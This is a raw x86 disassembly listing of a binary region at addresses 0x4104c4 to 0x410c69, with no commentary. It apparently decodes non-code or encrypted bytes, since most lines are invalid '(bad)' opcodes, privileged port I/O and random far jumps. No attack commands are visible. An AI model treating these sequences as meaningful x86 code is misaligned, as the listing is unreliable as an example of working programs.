  4104c4:	int3   
  4104c5:	mov    esp,0xaca4a409
  4104ca:	or     dh,BYTE PTR [edi]
  4104cc:	outs   dx,DWORD PTR ds:[esi]
  4104cd:	je     0x410511
  4104cf:	push   edx
  4104d0:	mov    edx,0x6ba170ee
  4104d5:	sbb    BYTE PTR [ecx-0x44234b45],0xaa
  4104dc:	push   ds
  4104dd:	shl    DWORD PTR [esi],1
  4104df:	icebp  
  4104e0:	inc    eax
  4104e1:	and    BYTE PTR [esp+esi*8+0x47],ah
  4104e5:	cld    
  4104e6:	xor    ecx,edx
  4104e8:	dec    ecx
  4104e9:	aaa    
  4104ea:	mov    ebx,0xdc588605
  4104ef:	leave  
  4104f0:	(bad)  
  4104f1:	retf   0xf813
  4104f4:	xchg   esp,eax
  4104f5:	test   BYTE PTR [edi+edi*1-0x1c],ch
  4104f9:	lods   eax,DWORD PTR ds:[esi]
  4104fa:	jbe    0x410514
  4104fc:	add    ebx,DWORD PTR [edx]
  4104fe:	rcl    BYTE PTR [ebp-0x2247f766],1
  410504:	(bad)  
  410505:	nop
  410506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410507:	jno    0x4104fc
  410509:	fs (bad) 
  41050b:	arpl   WORD PTR ds:[eax],bx
  41050e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41050f:	pushf  
  410510:	pop    edx
  410511:	lock pop ss
  410513:	sub    DWORD PTR [edx-0x5ab092b3],ebp
  410519:	pop    ss
  41051a:	clc    
  41051b:	mov    bh,0x31
  41051d:	ins    DWORD PTR es:[edi],dx
  41051e:	retf   
  41051f:	stos   DWORD PTR es:[edi],eax
  410520:	out    dx,al
  410521:	inc    ebx
  410522:	or     ecx,DWORD PTR [ebx]
  410524:	aaa    
  410525:	sub    al,0xf
  410527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410528:	imul   esi,eax,0xb697fd80
  41052e:	push   ecx
  41052f:	mov    DWORD PTR [ebp+ebx*4-0x58],ecx
  410533:	into   
  410534:	cmp    al,0xd7
  410536:	sbb    DWORD PTR [esi],0x42cd43ef
  41053c:	pop    esi
  41053d:	or     eax,0x977908f2
  410542:	popa   
  410543:	imul   ebx,DWORD PTR ds:0x7be27c4b,0x1c
  41054a:	push   esi
  41054b:	or     dl,BYTE PTR [esi]
  41054d:	sub    esp,esi
  41054f:	adc    ecx,DWORD PTR [eax+0x3f7a19a6]
  410555:	xor    eax,0xb71cf23c
  41055a:	jns    0x410508
  41055c:	fistp  DWORD PTR [ecx+eiz*1]
  41055f:	bound  esi,QWORD PTR [ecx]
  410561:	cmp    DWORD PTR [ebx+0x41],esi
  410564:	or     al,0x5a
  410566:	out    0x37,al
  410568:	dec    edx
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	pop    ebx
  410584:	push   eax
  410585:	in     al,0x6d
  410587:	cmp    DWORD PTR [ebx+0x78],edx
  41058a:	js     0x410571
  41058c:	jle    0x410606
  41058e:	js     0x41060d
  410590:	arpl   WORD PTR [edx+0x74],bx
  410593:	adc    eax,0x2588fd0f
  410598:	mov    dl,0xe5
  41059a:	push   es
  41059b:	std    
  41059c:	pop    esi
  41059d:	enter  0x1e13,0xa1
  4105a1:	adc    DWORD PTR [ecx-0xd],esi
  4105a4:	repz xor DWORD PTR [ebx-0x5a54a368],eax
  4105ab:	fdiv   QWORD PTR [edi+0x3dd60e4]
  4105b1:	mov    ss,WORD PTR [edi+0x9]
  4105b4:	or     DWORD PTR [eax+0x1e22e9e1],esp
  4105ba:	sbb    cl,ch
  4105bc:	mov    ebp,0x7173ca88
  4105c1:	loopne 0x4105be
  4105c3:	repz idiv dl
  4105c6:	bound  ebx,QWORD PTR [ebp-0x1854812f]
  4105cc:	mov    dh,0xe6
  4105ce:	sub    al,0x1f
  4105d0:	jns    0x410565
  4105d2:	mov    esp,0xaa0b3216
  4105d7:	je     0x4105be
  4105d9:	and    ah,ch
  4105db:	xchg   ecx,eax
  4105dc:	pop    esp
  4105dd:	ficomp DWORD PTR [ebp+0x439cb5d0]
  4105e3:	jb     0x41061b
  4105e5:	rcl    BYTE PTR [eax-0x16],0x7e
  4105e9:	retf   
  4105ea:	sub    eax,0xc9750781
  4105ef:	push   ebp
  4105f0:	rcl    BYTE PTR [edi],0x9
  4105f3:	repnz push ebp
  4105f5:	(bad)
  4105fa:	push   ss
  4105fb:	sahf   
  4105fc:	pop    esp
  4105fd:	(bad)  
  4105fe:	xor    eax,0x43eeea39
  410603:	mov    ah,0xe
  410605:	sar    BYTE PTR [eax+ebx*1],1
  410608:	sbb    dl,dh
  41060a:	pop    es
  41060b:	xchg   ebx,eax
  41060c:	aad    0xb2
  41060e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41060f:	int3   
  410610:	jo     0x410671
  410612:	jle    0x4105b6
  410614:	inc    edx
  410615:	ret    0xa2cc
  410618:	pop    es
  410619:	cs (bad) 
  41061b:	mov    eax,ss:0xf6b2d69c
  410621:	adc    esp,ecx
  410623:	cmp    DWORD PTR [ebx+0x8f8f7d0],esi
  410629:	and    ch,0x1a
  41062c:	adc    al,0xc9
  41062e:	ret    0x13df
  410631:	mov    cl,BYTE PTR [edx-0x7d094770]
  410637:	pop    eax
  410638:	int    0x30
  41063a:	mov    esi,0x994685c8
  41063f:	ror    DWORD PTR [esi-0x77],0x9d
  410643:	int    0xec
  410645:	fbstp  TBYTE PTR [ecx+0x8]
  410648:	enter  0xe17c,0xb6
  41064c:	dec    ebx
  41064d:	pushf  
  41064e:	sar    DWORD PTR [ecx],1
  410650:	js     0x4105fe
  410652:	mov    ebx,0xbe56cbf0
  410657:	push   0xbe84b44d
  41065c:	mov    ds:0xccf9e8fe,eax
  410661:	call   0xf89c:0x256d4f32
  410668:	dec    eax
  410669:	and    ebp,ebp
  41066b:	loopne 0x4105fb
  41066d:	hlt    
  41066e:	test   al,0x7e
  410670:	adc    BYTE PTR [ebp+0x7000aea7],dh
  410676:	mov    BYTE PTR [ebx],al
  410678:	adc    al,0x6c
  41067a:	pop    ebx
  41067b:	fs or  edx,esp
  41067e:	inc    edi
  41067f:	(bad)  
  410680:	outs   dx,BYTE PTR ds:[esi]
  410681:	mov    ch,0xa7
  410683:	out    0xc2,al
  410685:	in     al,dx
  410686:	mov    ebp,?
  410688:	int3   
  410689:	push   0xfffffff3
  41068b:	pop    edx
  41068c:	jae    0x41062d
  41068e:	xor    BYTE PTR [ebp-0x2ac84d9a],bl
  410694:	cli    
  410695:	cld    
  410696:	mov    fs,WORD PTR [ebx]
  410698:	jle    0x4106ee
  41069a:	sbb    DWORD PTR ds:0x7a06a9ff,esp
  4106a0:	dec    eax
  4106a1:	dec    eax
  4106a2:	mov    dl,0xff
  4106a4:	pop    edi
  4106a5:	js     0x4106af
  4106a7:	sub    al,0xa
  4106a9:	(bad)  
  4106aa:	retf   0x7724
  4106ad:	push   edi
  4106ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106af:	pop    edx
  4106b0:	xchg   esi,eax
  4106b1:	icebp  
  4106b2:	mov    cl,0x8d
  4106b4:	test   eax,0xcc6ed7c4
  4106b9:	mov    esp,0x15854f31
  4106be:	sbb    DWORD PTR [esi+0x76e73aac],ebp
  4106c4:	iret   
  4106c5:	cdq    
  4106c6:	popa   
  4106c7:	sub    BYTE PTR [edi+0x6356fdf6],cl
  4106cd:	cmp    bh,BYTE PTR [ecx]
  4106cf:	jmp    0x41074c
  4106d1:	add    eax,0xa08d3096
  4106d6:	fbld   TBYTE PTR [edx+ecx*2]
  4106d9:	pop    edi
  4106da:	fisttp DWORD PTR [eax-0x5a]
  4106dd:	jle    0x4106f8
  4106df:	std    
  4106e0:	or     eax,0x3e469bc3
  4106e5:	jp     0x41073a
  4106e7:	shl    esi,0x65
  4106ea:	mov    BYTE PTR [ecx],dh
  4106ec:	xchg   ebx,eax
  4106ed:	mov    DWORD PTR [ebx-0x3c],edi
  4106f0:	pop    edi
  4106f1:	sbb    al,0x83
  4106f3:	jmp    FWORD PTR [edi+0x20]
  4106f6:	jge    0x41070a
  4106f8:	jns    0x4106e7
  4106fa:	(bad)  [edx+edx*2+0x5e]
  4106fe:	mov    DWORD PTR [edx+0x207a3ec2],esp
  410704:	inc    edi
  410705:	pop    esi
  410706:	mov    ebx,0xc19b2e30
  41070b:	or     bh,0xf9
  41070e:	ret    
  41070f:	sbb    al,0xd8
  410711:	jnp    0x410783
  410713:	out    dx,al
  410714:	pushf  
  410715:	push   edx
  410716:	mov    ds:0x3fc4f58,eax
  41071b:	dec    esi
  41071c:	cmp    al,0x82
  41071e:	cmp    BYTE PTR [ebp-0x31],dh
  410721:	fbstp  TBYTE PTR ds:0x510b9c6
  410727:	or     dh,0xe5
  41072a:	fdiv   QWORD PTR [ecx-0x28]
  41072d:	adc    BYTE PTR [ebp-0x2b310da0],0xd3
  410734:	sar    BYTE PTR [ecx-0x2c],cl
  410737:	clc    
  410738:	lods   eax,DWORD PTR ds:[esi]
  410739:	sti    
  41073a:	fmulp  st(0),st
  41073c:	jge    0x410738
  41073e:	leave  
  41073f:	jg     0x410758
  410741:	mov    al,ds:0xea8e3169
  410746:	int    0x8
  410748:	and    BYTE PTR ds:0x3acc798d,cl
  41074e:	sbb    eax,0x8ff2d0aa
  410753:	add    eax,0x76929e5
  410758:	xchg   edi,eax
  410759:	sub    ch,BYTE PTR [ecx-0x3ce82def]
  41075f:	not    DWORD PTR [ebx]
  410761:	sbb    bh,ah
  410763:	lock xor ebx,DWORD PTR [eax+ecx*8]
  410767:	sub    al,0x99
  410769:	or     BYTE PTR ds:0x79baac2c,0x70
  410770:	fwait
  410771:	call   0x64d1:0xd1d56a03
  410778:	outs   dx,BYTE PTR ds:[esi]
  410779:	inc    ebp
  41077a:	gs inc esp
  41077c:	dec    edi
  41077d:	je     0x4107bd
  41077f:	push   ds
  410780:	in     eax,0xdf
  410782:	push   0x8114c6b0
  410787:	xor    dl,ch
  410789:	cmc    
  41078a:	repz cmp ch,dh
  41078d:	xchg   edx,eax
  41078e:	pop    ebp
  41078f:	push   ss
  410790:	retf   
  410791:	and    ah,dh
  410793:	jmp    0xf9c6b22a
  410798:	repnz pop ebx
  41079a:	adc    al,0xe2
  41079c:	and    ecx,edx
  41079e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41079f:	push   edi
  4107a0:	jmp    0x410746
  4107a2:	cli    
  4107a3:	inc    esi
  4107a4:	pop    ebx
  4107a5:	ds (bad) 
  4107a8:	das    
  4107a9:	push   ds
  4107aa:	scas   eax,DWORD PTR es:[edi]
  4107ab:	push   es
  4107ac:	lea    eax,[edi+edi*1-0x4a]
  4107b0:	stos   DWORD PTR es:[edi],eax
  4107b1:	daa    
  4107b2:	xor    al,0x2b
  4107b4:	cld    
  4107b5:	jno    0x4107ce
  4107b7:	scas   al,BYTE PTR es:[edi]
  4107b8:	mov    al,ds:0x28a07d94
  4107bd:	dec    esp
  4107be:	inc    eax
  4107bf:	sub    DWORD PTR [esi],esi
  4107c1:	loop   0x4107ad
  4107c3:	fucomi st,st(4)
  4107c5:	lahf   
  4107c6:	push   edx
  4107c7:	mov    esi,0xd91bcf1d
  4107cc:	cmp    edi,DWORD PTR [edi]
  4107ce:	cli    
  4107cf:	int    0x84
  4107d1:	jb     0x41076b
  4107d3:	ss aas 
  4107d5:	pop    esi
  4107d6:	pop    ss
  4107d7:	add    ebp,esp
  4107d9:	stos   BYTE PTR es:[edi],al
  4107da:	jbe    0x41076f
  4107dc:	mov    edi,0xd5e8db2e
  4107e1:	and    ebp,DWORD PTR [esi-0x7]
  4107e4:	out    0x15,eax
  4107e6:	push   ecx
  4107e7:	push   ebx
  4107e8:	in     eax,dx
  4107e9:	in     al,0x7f
  4107eb:	in     al,0xa4
  4107ed:	sbb    DWORD PTR [ebp-0x2f],0xb30b6e31
  4107f4:	and    eax,0xde9f4051
  4107f9:	sbb    DWORD PTR [ebx],ebp
  4107fb:	fistp  QWORD PTR [ebx]
  4107fd:	fucompp 
  4107ff:	add    DWORD PTR [edx],0x0
  410802:	add    dh,cl
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	fdiv   DWORD PTR [edx+0x45]
  410812:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	cwde   
  41081c:	lods   al,BYTE PTR ds:[esi]
  41081d:	fst    QWORD PTR [edx+0x14ae0457]
  410823:	and    BYTE PTR [edx-0x146da234],bh
  410829:	xchg   DWORD PTR [ebp+0x59],esi
  41082c:	out    0x74,eax
  41082e:	iret   
  41082f:	jge    0x4108aa
  410831:	cli    
  410832:	cdq    
  410833:	out    dx,eax
  410834:	add    ebp,DWORD PTR [ebp-0x7275efb3]
  41083a:	repnz add al,0xd5
  41083d:	dec    ecx
  41083e:	ret    0x6a48
  410841:	pop    ebx
  410842:	ficomp DWORD PTR [ebp+esi*1+0x8c2afbe]
  410849:	cli    
  41084a:	in     al,dx
  41084b:	adc    al,0xf9
  41084d:	fsub   QWORD PTR [ecx]
  41084f:	push   0xffffff8d
  410851:	or     DWORD PTR [edi+0x1d],edx
  410854:	in     al,dx
  410855:	xchg   edx,eax
  410856:	or     DWORD PTR [ebx-0x4d9db4b7],ecx
  41085c:	gs stc 
  41085e:	xor    BYTE PTR [edx-0x5d4a1351],dh
  410864:	je     0x4108d4
  410866:	xchg   ecx,eax
  410868:	lock aas 
  41086a:	adc    BYTE PTR [ebx-0x40bbc425],al
  410870:	cli    
  410871:	adc    BYTE PTR [ebx+0x2d],ah
  410874:	shl    BYTE PTR [esi],cl
  410876:	cld    
  410877:	outs   dx,BYTE PTR ds:[esi]
  410878:	cld    
  410879:	aam    0x1a
  41087b:	mov    esi,0xfdb21cfa
  410880:	div    BYTE PTR [ecx+0x4b536d1f]
  410886:	sbb    ecx,DWORD PTR [eax-0x69e84239]
  41088c:	pop    edx
  41088d:	pop    ss
  41088e:	repnz mov ah,0x3f
  410891:	jle    0x410823
  410893:	push   ebx
  410894:	je     0x4108fa
  410896:	les    ecx,FWORD PTR [ebp+0x4b4d1]
  41089c:	pop    ss
  41089d:	pusha  
  41089e:	psubw  mm4,QWORD PTR [ebp+ebx*4+0x1c2e766e]
  4108a6:	scas   al,BYTE PTR es:[edi]
  4108a7:	dec    edx
  4108a8:	mov    ch,0xac
  4108aa:	test   DWORD PTR [ecx+ecx*8],edx
  4108ad:	xchg   esi,eax
  4108ae:	loope  0x41083a
  4108b0:	(bad)  
  4108b1:	add    DWORD PTR [edx*4-0x17c87c0c],ebp
  4108b8:	jb     0x4108f7
  4108ba:	mov    ds:0xce694e1,eax
  4108bf:	inc    edx
  4108c0:	std    
  4108c1:	fs jmp 0x4108cf
  4108c4:	call   0x2bb3a0ac
  4108c9:	das    
  4108ca:	dec    eax
  4108cb:	dec    edi
  4108cc:	push   esp
  4108cd:	daa    
  4108ce:	(bad)  
  4108cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d0:	and    eax,0x73243ff7
  4108d5:	frstor [esi+0x639f22f2]
  4108db:	test   al,0x54
  4108dd:	inc    ebx
  4108de:	or     DWORD PTR [edx-0x4d],ecx
  4108e1:	lds    edx,FWORD PTR [esi+ecx*8-0x7df0bd6b]
  4108e8:	retf   
  4108e9:	fcmovnbe st,st(0)
  4108eb:	(bad)  
  4108ec:	das    
  4108ed:	mov    al,0xde
  4108ef:	xor    eax,edx
  4108f1:	fisttp DWORD PTR [eax-0x3e1e007d]
  4108f7:	pusha  
  4108f8:	out    0xae,eax
  4108fa:	or     BYTE PTR [ebp+0x71],al
  4108fd:	push   ecx
  4108fe:	dec    edx
  4108ff:	jae    0x41089f
  410901:	xchg   ebp,eax
  410902:	aam    0x0
  410904:	icebp  
  410905:	inc    ebp
  410906:	lds    ebp,FWORD PTR [ebx-0x7c]
  410909:	sar    al,cl
  41090b:	int    0xac
  41090d:	enterw 0x1b57,0xeb
  410912:	jp     0x410912
  410914:	xchg   esp,eax
  410915:	xchg   dh,bh
  410917:	adc    DWORD PTR [esi+0x6ce7f342],edi
  41091d:	ins    BYTE PTR es:[edi],dx
  41091e:	mov    dl,0x54
  410920:	mov    DWORD PTR ds:[ebp-0x16],edx
  410924:	pop    ebx
  410925:	fcom   DWORD PTR [esi]
  410927:	xor    al,al
  410929:	push   ds
  41092a:	out    0x79,al
  41092c:	out    dx,eax
  41092d:	aaa    
  41092e:	dec    edx
  41092f:	and    al,0xaf
  410931:	and    BYTE PTR [edx],bl
  410933:	mov    al,0xbb
  410935:	sub    cl,BYTE PTR [eax-0x283abe96]
  41093b:	push   cs
  41093c:	popf   
  41093d:	rcl    BYTE PTR [esi],cl
  41093f:	push   eax
  410940:	pop    ebx
  410941:	pop    ss
  410942:	icebp  
  410943:	sti    
  410944:	scas   eax,DWORD PTR es:[edi]
  410945:	sub    cl,BYTE PTR [ecx+ebx*1+0x5b]
  410949:	xchg   ebp,eax
  41094a:	fnstenv [esi-0x7636bdbf]
  410950:	jno    0x4109aa
  410952:	pop    ss
  410953:	mov    ah,BYTE PTR [ebx+0x70c3dfb2]
  410959:	sbb    eax,0x2fd16136
  41095e:	mov    ebx,0x4845648f
  410963:	push   ecx
  410964:	aad    0x49
  410966:	icebp  
  410967:	pop    ecx
  410968:	(bad)  
  410969:	jmp    FWORD PTR [ebx+eax*1+0x712c7c5a]
  410970:	cmp    eax,0x18370afa
  410975:	in     al,0xd6
  410977:	out    dx,al
  410978:	scas   eax,DWORD PTR es:[edi]
  410979:	call   0x80f32f02
  41097e:	mov    eax,ds:0xa1ebbc51
  410983:	inc    ebx
  410984:	add    eax,0xbf9a923a
  410989:	xchg   ebp,eax
  41098a:	pop    ebp
  41098b:	or     DWORD PTR [edx+0x19],esp
  41098e:	push   edx
  41098f:	sti    
  410990:	in     al,dx
  410991:	(bad)  
  410992:	lock pop ss
  410994:	xchg   ebp,eax
  410995:	addr16 aaa 
  410997:	sub    esi,edx
  410999:	push   edx
  41099a:	stc    
  41099b:	(bad)  
  41099c:	sti    
  41099d:	jae    0x4109af
  41099f:	pop    ebx
  4109a0:	dec    ecx
  4109a1:	push   ecx
  4109a2:	repz mov ebp,0x78f23089
  4109a8:	sub    al,0x1e
  4109aa:	dec    eax
  4109ab:	mov    ds:0xeb1310e8,al
  4109b0:	cli    
  4109b1:	(bad)  
  4109b2:	push   ebx
  4109b3:	popf   
  4109b4:	gs inc ebp
  4109b6:	push   ebp
  4109b7:	sub    bh,BYTE PTR [eax-0x3a]
  4109ba:	mov    ebp,0x20fdf2
  4109bf:	inc    edx
  4109c0:	mov    ch,0x84
  4109c2:	xor    ecx,edx
  4109c4:	loope  0x41097a
  4109c6:	(bad)  
  4109c7:	pop    ss
  4109c8:	sbb    DWORD PTR [esi+0x323e6da7],eax
  4109ce:	xchg   ecx,eax
  4109cf:	xchg   ecx,eax
  4109d0:	out    0xc5,eax
  4109d2:	pop    esp
  4109d3:	xor    al,0x70
  4109d5:	in     eax,0x4a
  4109d7:	xchg   edx,eax
  4109d8:	sbb    al,0x5d
  4109da:	mov    esi,0x52affff
  4109df:	inc    ebp
  4109e0:	outs   dx,DWORD PTR ds:[esi]
  4109e1:	mov    bl,0x84
  4109e3:	data16 fnstcw WORD PTR [ecx]
  4109e6:	pop    esi
  4109e7:	jecxz  0x4109db
  4109e9:	test   eax,0xed463ca4
  4109ee:	jp     0x4109a4
  4109f0:	jb     0x4109f3
  4109f2:	cwde   
  4109f3:	sahf   
  4109f4:	dec    ebx
  4109f5:	in     eax,dx
  4109f6:	mov    ah,0xe8
  4109f8:	jmp    0x4519c680
  4109fd:	push   ss
  4109fe:	pop    ebx
  4109ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a00:	lock (bad) 
  410a02:	add    BYTE PTR [ecx],bh
  410a04:	(bad)  
  410a05:	push   0x49a02238
  410a0a:	push   esp
  410a0b:	xchg   edx,eax
  410a0c:	or     eax,0xd4a62e8c
  410a11:	(bad)  
  410a12:	or     eax,0x9d000b94
  410a17:	daa    
  410a18:	rcl    esp,0xb9
  410a1b:	or     dl,ch
  410a1d:	es mov ecx,0x26f93634
  410a23:	pop    eax
  410a24:	fwait
  410a25:	pop    eax
  410a26:	add    al,0xb1
  410a28:	cs pop eax
  410a2a:	ret    
  410a2b:	mov    cs,WORD PTR [ebx]
  410a2d:	inc    ebp
  410a2e:	and    al,0xc
  410a30:	mov    ds:0x93a37cbe,eax
  410a35:	inc    edi
  410a36:	push   es
  410a37:	test   al,0x7c
  410a39:	lods   eax,DWORD PTR ds:[esi]
  410a3a:	mov    DWORD PTR [ebp-0x37b5ef6],ebp
  410a40:	mov    bl,0xdf
  410a42:	mov    ch,0x72
  410a44:	add    DWORD PTR [edx-0x7b],0xffffff91
  410a48:	aam    0xc0
  410a4a:	mov    ebx,0x753fdbe3
  410a4f:	cmp    BYTE PTR [eax],ah
  410a51:	imul   edi,DWORD PTR [edx-0x51145f5b],0xfffffff2
  410a58:	test   eax,0xb484afd3
  410a5d:	shr    dl,cl
  410a5f:	shl    BYTE PTR [edi-0x4742e8fc],cl
  410a65:	cmp    al,0xd3
  410a67:	xchg   edx,eax
  410a68:	jg     0x410a49
  410a6a:	bound  esp,QWORD PTR [ebp+0x10]
  410a6d:	fidiv  WORD PTR [ecx+0x7732ffaf]
  410a73:	mov    esp,0x6fee4575
  410a78:	retf   0xb48e
  410a7b:	adc    DWORD PTR [ebx+0x0],edi
  410a7e:	jmp    0x410a0f
  410a80:	outs   dx,DWORD PTR ds:[esi]
  410a81:	or     esp,DWORD PTR [esi]
  410a83:	gs imul esi,edi,0xf
  410a87:	xchg   DWORD PTR [eax],ecx
  410a89:	add    BYTE PTR [eax],al
  410a8b:	add    BYTE PTR [ebx-0x1d1627ab],cl
  410a91:	adc    al,0x0
  410a93:	add    BYTE PTR [ebx+0x7d8bd055],cl
  410a99:	cld    
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	imul   DWORD PTR [ebx+0x33]
  410ab1:	int    0x9d
  410ab3:	adc    edx,DWORD PTR [esi+0x78]
  410ab6:	js     0x410a9d
  410ab8:	jle    0x410b32
  410aba:	js     0x410b29
  410abc:	xchg   esp,eax
  410abd:	mov    al,0x36
  410abf:	xlat   BYTE PTR ds:[ebx]
  410ac0:	and    BYTE PTR [edi+edx*1-0x32],ch
  410ac4:	stc    
  410ac5:	(bad)  ds:0xf8eff1bd
  410acb:	in     eax,dx
  410acc:	adc    cl,cl
  410ace:	test   BYTE PTR [edx+esi*8],bh
  410ad1:	mov    ebx,0x545a13c4
  410ad6:	cmp    dl,cl
  410ad8:	sahf   
  410ad9:	add    eax,0xbea314e6
  410ade:	mov    ds:0x719242fc,eax
  410ae3:	xchg   BYTE PTR [edx+ebp*1],al
  410ae6:	iret   
  410ae7:	in     eax,0xa5
  410ae9:	jmp    0x410b11
  410aeb:	clc    
  410aec:	(bad)  
  410aed:	adc    eax,0xf178f41c
  410af2:	adc    ebx,ecx
  410af4:	fidiv  WORD PTR [ecx-0x5c]
  410af7:	retf   
  410af8:	imul   eax,DWORD PTR [edx-0x41021f0c],0x9e49daad
  410b02:	cdq    
  410b03:	push   esp
  410b04:	data16 jb 0x410aa6
  410b07:	mov    ah,0xaf
  410b09:	inc    ecx
  410b0a:	ds sahf 
  410b0c:	or     bl,bl
  410b0e:	test   cl,al
  410b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b11:	mov    edx,0x183ecfc4
  410b16:	jge    0x410b3a
  410b18:	je     0x410b7a
  410b1a:	mov    cl,0xf1
  410b1c:	add    al,0xa9
  410b1e:	xor    eax,0x3298dcfe
  410b23:	xchg   DWORD PTR [edx+0x32de073d],ecx
  410b29:	or     dl,BYTE PTR [ebp-0x74363a81]
  410b2f:	jno    0x410b5a
  410b31:	inc    esi
  410b32:	jg     0x410b59
  410b34:	push   edx
  410b35:	pushf  
  410b36:	pop    es
  410b37:	rol    DWORD PTR [ebx-0x2b],1
  410b3a:	pop    edi
  410b3b:	mov    esi,0x52aac83
  410b40:	dec    edi
  410b41:	(bad)  
  410b42:	fsub   DWORD PTR [edi]
  410b44:	pop    esi
  410b45:	or     eax,0xbe1788dd
  410b4a:	pop    edx
  410b4b:	adc    esp,ebp
  410b4d:	push   0x3f0c6e33
  410b52:	jnp    0x410b38
  410b54:	mov    es,WORD PTR [ebp-0x49]
  410b57:	leave  
  410b58:	push   ecx
  410b59:	adc    BYTE PTR ss:[edi+0x5c],ch
  410b5d:	inc    ecx
  410b5e:	clc    
  410b5f:	lods   eax,DWORD PTR ds:[esi]
  410b60:	test   BYTE PTR [esi],dl
  410b62:	xchg   ebp,eax
  410b63:	jno    0x410b32
  410b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b66:	(bad)  
  410b67:	lahf   
  410b68:	(bad)  
  410b6a:	scas   al,BYTE PTR es:[edi]
  410b6b:	pop    edi
  410b6c:	in     al,0xbe
  410b6e:	scas   eax,DWORD PTR es:[edi]
  410b6f:	xor    DWORD PTR [esi-0x71],0xffffff8b
  410b73:	mov    dl,0x71
  410b75:	retf   0x91
  410b78:	push   ebx
  410b79:	clc    
  410b7a:	test   ch,ch
  410b7c:	adc    eax,0x51e4d52e
  410b81:	cmp    al,0xa2
  410b83:	cmp    ch,cl
  410b85:	mov    edx,0x2f4c910f
  410b8a:	pop    ebx
  410b8b:	retf   
  410b8c:	scas   eax,DWORD PTR es:[edi]
  410b8d:	test   edi,esp
  410b8f:	sbb    dh,ch
  410b91:	dec    ecx
  410b92:	popf   
  410b93:	mov    ecx,0xe9af2ae
  410b98:	test   BYTE PTR [esp+esi*4],0xff
  410b9c:	jle    0x410bc9
  410b9e:	adc    DWORD PTR [ecx-0x41],0x9a4c7f96
  410ba5:	and    dh,BYTE PTR [edx-0x4acd4930]
  410bab:	mov    bl,0x3
  410bad:	std    
  410bae:	neg    BYTE PTR [eax]
  410bb0:	sbb    DWORD PTR [ecx],edi
  410bb2:	cmp    BYTE PTR [esi],dl
  410bb4:	fdivr  QWORD PTR [eax+0x2a]
  410bb7:	dec    esp
  410bb8:	mov    DWORD PTR [ecx],edx
  410bba:	or     esi,edi
  410bbc:	mov    esi,0x306c35e5
  410bc1:	dec    edi
  410bc2:	(bad)  
  410bc3:	xor    eax,0xa397b2a3
  410bc8:	js     0x410b73
  410bca:	sub    al,0x54
  410bcc:	rol    BYTE PTR [esi],1
  410bce:	scas   al,BYTE PTR es:[edi]
  410bcf:	sub    dl,bh
  410bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bd2:	push   ecx
  410bd3:	ret    0x3097
  410bd6:	pop    ebx
  410bd7:	xchg   edi,eax
  410bd8:	xlat   BYTE PTR ds:[ebx]
  410bd9:	js     0x410b81
  410bdb:	sbb    al,0xfc
  410bdd:	das    
  410bde:	loopne 0x410c3a
  410be0:	jns    0x410c1f
  410be2:	lds    eax,FWORD PTR [ebx+eax*8-0x4a]
  410be6:	and    BYTE PTR ds:0xe814e8c1,ah
  410bec:	dec    edx
  410bed:	mov    BYTE PTR [ebp+0x5a],al
  410bf0:	or     cl,BYTE PTR [eax+0x518e0bf0]
  410bf6:	daa    
  410bf7:	pushf  
  410bf8:	sti    
  410bf9:	inc    ebx
  410bfa:	inc    ebx
  410bfb:	cmp    edx,edi
  410bfd:	push   ebp
  410bfe:	int    0x92
  410c00:	(bad)  
  410c01:	cmc    
  410c02:	mov    ds:0xeffb21cb,eax
  410c07:	dec    esi
  410c08:	fs das 
  410c0a:	inc    eax
  410c0b:	jmp    0xef7e:0x763c
  410c11:	int3   
  410c12:	mov    ebx,0x3f0b1159
  410c17:	jno    0x410c32
  410c19:	frstpm(287 only) 
  410c1b:	ds cdq 
  410c1d:	xor    BYTE PTR [ebp-0x7f1b80de],0x28
  410c24:	pop    edx
  410c25:	test   BYTE PTR [ecx+0xb],0xa3
  410c29:	pop    eax
  410c2a:	fdiv   QWORD PTR [eax+0x36cd665]
  410c30:	jo     0x410bfa
  410c32:	fwait
  410c33:	mov    es,WORD PTR [esi]
  410c35:	outs   dx,BYTE PTR ds:[esi]
  410c36:	loopne 0x410bba
  410c38:	push   ds
  410c39:	ins    BYTE PTR es:[edi],dx
  410c3a:	sbb    eax,DWORD PTR [ebx+0x6a279f14]
  410c40:	inc    ecx
  410c41:	lock int 0x79
  410c44:	out    0xcc,al
  410c46:	jo     0x410c73
  410c48:	(bad)  
  410c49:	(bad)  
  410c4a:	popa   
  410c4b:	jl     0x410c9e
  410c4d:	popf   
  410c4e:	bound  eax,QWORD PTR [ebx-0x6586118a]
  410c54:	pop    es
  410c55:	call   0xfbc5:0x256fa310
  410c5c:	and    DWORD PTR [esi+0x2e],ebx
  410c5f:	cdq    
  410c60:	dec    esi
  410c61:	mov    WORD PTR [edx+0x7c],es
  410c64:	je     0x410cd4
  410c66:	pop    esi
  410c67:	mov    DWORD PTR [esi],eax
  410c69:	cli    
